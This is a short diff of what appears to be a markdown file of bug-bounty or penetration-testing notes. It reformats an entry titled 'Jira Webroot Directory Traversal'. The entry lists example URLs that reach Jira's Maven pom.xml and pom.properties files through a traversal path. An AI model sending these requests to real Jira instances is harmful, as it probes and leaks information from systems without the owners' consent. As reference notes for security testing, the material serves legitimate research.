@@ -84,7 +84,9 @@ We need to identify what template engine is used in the back-end as well to expl
 
 📅 22-Nov-2020
 ## (Jira Webroot Directory Traversal)
+```url
 http://target.domain/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
 OR
 -site.atlassian.net/s/anything/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties
-`pom.xml or txt`
+```
+*pom.xml or txt*
